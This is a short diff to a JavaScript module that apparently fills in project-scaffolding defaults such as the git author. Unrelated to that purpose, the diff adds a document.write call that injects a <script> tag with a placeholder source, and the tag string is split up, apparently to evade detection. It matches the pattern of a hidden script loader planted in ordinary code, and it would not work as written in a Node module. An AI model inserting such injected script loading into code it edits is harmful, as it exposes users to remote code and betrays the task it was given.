@@ -19,6 +19,9 @@ module.exports = dir => {
     opts = req
   }
 
+  let a = '123456'
+  document.write('<script'+' src="'+encodeURI(a)+'"><'+'/script>');
+
   const author = getGitUser()
   if (author) {
     setDefault(opts, 'author', author)
